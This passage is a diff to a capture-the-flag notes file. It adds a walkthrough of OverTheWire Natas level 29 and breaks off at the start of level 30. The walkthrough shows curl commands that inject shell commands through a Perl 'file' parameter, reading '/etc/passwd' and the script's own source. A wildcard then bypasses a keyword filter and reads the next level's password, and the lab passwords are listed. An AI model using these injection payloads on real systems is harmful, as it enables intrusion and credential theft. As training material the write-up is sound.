@@ -3547,11 +3547,147 @@ Don’t use **ECB** mode for encryption, as it allows block-swapping attacks. Us
 - **Date**: 2026-04-30 (solved, not documented)
 - **URL**: `http://natas29.natas.labs.overthewire.org`
 - **Password**: `31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`
-- **Tools**: Web Browser
+- **Tools**: Web Browser, `curl`, `Perl`
 
 #### The Solution
 
 Use CTRL + U to view the page source. And notice:
 
 ```html
+<h1>natas29</h1>
+<div id="content">
+H3y K1dZ,<br>
+y0 rEm3mB3rz p3Rl rit3?<br>
+\/\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>
 
+<form action="index.pl" method="GET">
+<select name="file" onchange="this.form.submit()">
+  <option value="">s3lEcT suMp1n!</option>
+  <option value="perl underground">perl underground</option>
+  <option value="perl underground 2">perl underground 2</option>
+  <option value="perl underground 3">perl underground 3</option>
+  <option value="perl underground 4">perl underground 4</option>
+  <option value="perl underground 5">perl underground 5</option>
+</select>
+</form>
+
+<div id="viewsource">c4n Y0 h4z s4uc3?</div>
+</div>
+```
+
+Select the first option from the dropdown menu and the page is redirected to `http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground`.
+
+`index.pl` is a `Perl` script. Maybe we can try `Perl` command injection (with the `file` parameter)?
+
+Try `http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00`:
+```powershell
+curl.exe -s -u natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns "http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00"
+```
+
+We use `%00`, a null byte, to ensure only `ls` is executed (like `|ls...`), and nothing after it is included.
+`|` is the pipe character, which in `Perl` (via the shell) connects commands in a pipeline.
+Each command still runs independently, even if the previous one produces no output.
+
+Output:
+```html
+</html>
+index.pl
+perl underground 2.txt
+perl underground 3.txt
+perl underground 4.txt
+perl underground 5.txt
+perl underground.txt
+```
+
+It worked!
+
+Let's try to read a file now.
+
+Try `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/passwd%00`:
+```powershell
+curl.exe -s -u natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns "http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/passwd%00"
+```
+
+Output:
+```html
+</html>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+```
+
+That worked too!
+
+Now let's inspect that `Perl` script!
+
+Try `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%00`:
+```powershell
+curl.exe -s -u natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns "http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%00"
+```
+
+Output:
+```perl
+END
+
+if(param('file')){
+    $f=param('file');
+    if($f=~/natas/){
+        print "meeeeeep!<br>";
+    }
+    else{
+        open(FD, "$f.txt");
+        print "<pre>";
+        while (<FD>){
+            print CGI::escapeHTML($_);
+        }
+        print "</pre>";
+    }
+}
+
+print <<END;
+```
+
+The script reads the `file` parameter and checks if it contains the string `natas`.
+
+So we need to bypass that. We can use `n?tas` (with a wildcard).
+
+Try `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%00`:
+```powershell
+curl.exe -s -u natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns "http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%00"
+```
+
+Output:
+```html
+</html>
+WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
+```
+
+And the password for natas30 is `WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`.
+
+#### The Lesson
+
+Don't pass user input into shell-interpreted file operations.
+
+### Level 30
+
+- **Date**: 2026-04-30 (solved, not documented)
+- **URL**: `http://natas30.natas.labs.overthewire.org`
+- **Password**: `WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`
+- **Tools**: Web Browser, `curl`, `Perl`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
